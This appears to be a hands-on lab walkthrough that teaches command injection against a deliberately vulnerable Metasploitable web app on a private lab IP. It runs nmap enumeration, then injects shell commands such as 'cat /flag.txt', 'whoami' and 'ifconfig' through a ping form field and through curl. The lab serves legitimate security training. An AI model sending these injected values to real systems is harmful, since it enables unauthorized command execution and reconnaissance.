# Attacker Scenario 1: Web Enumeration and Command Injection

## Objective
Identify a vulnerable web application on a highly insecure host, explore its functionality, and exploit a Command Injection vulnerability to retrieve a hidden flag.

## Scenario
You are working from an Ubuntu workstation on a target network. Your initial reconnaissance has identified a potential host at IP address `172.20.0.10`. This machine is known as "Metasploitable," a Linux distribution intentionally configured with numerous vulnerabilities. Your task is to investigate this server and see if you can gain further access via its web services.

## Steps
### 1. Enumeration
First, let's see what services are running on the target. Open a terminal on your workstation:

```bash
nmap -sV 172.20.0.10
```

**Note:** You will see a large number of open ports! This is typical of a poorly secured legacy server. For this exercise, we will focus on the web service.

Confirm that port 80 (HTTP) is open and running Apache.

### 2. Investigation
Open a browser and navigate to `http://172.20.0.10`.

The application seems to be a "Network Diagnostics Tool" that allows users to ping an IP address.

### 3. Testing for Vulnerability
Test the tool by pinging the loopback address:
`127.0.0.1`

Now, let's see if the application is vulnerable to command injection. Command injection occurs when an application passes unvalidated user input to a system shell. We can try to append another command using a semicolon (`;`).

Try entering the following into the ping tool on the webpage:
`127.0.0.1; ls /`

Or via your terminal:
```bash
curl -X POST -d "ip=127.0.0.1; ls /" http://172.20.0.10
```

If the output shows a list of files in the root directory (like `bin`, `etc`, `home`, and notably `flag.txt`), the application is vulnerable!

### 4. Exploitation
Now that you have confirmed command injection, search for the flag.

Try to read the contents of `/flag.txt` using the injection:
`127.0.0.1; cat /flag.txt`

```bash
curl -X POST -d "ip=127.0.0.1; cat /flag.txt" http://172.20.0.10
```

### 5. Post-Exploitation Discovery
Command injection is particularly dangerous because it often gives the attacker the same permissions as the web server user. Let's see who we are running as:

`127.0.0.1; whoami`

```bash
curl -X POST -d "ip=127.0.0.1; whoami" http://172.20.0.10
```

You can also explore the network configuration of the target:

`127.0.0.1; ifconfig`

An attacker would use this "foothold" to pivot deeper into the internal network, looking for databases, credentials, or other sensitive systems.

### 6. The "Why" - Real World Impact
In a real environment, a single vulnerable form like this can lead to a full network compromise. Vulnerabilities like **Command Injection** (often categorized under OWASP Top 10's "Injection") occur when developers trust user input too much. 

As a cybersecurity professional, your job is to find these "cracks in the armor" before an attacker does, helping developers build more resilient and secure applications.

### 7. Cleanup
Run `./scenario1.sh reset`
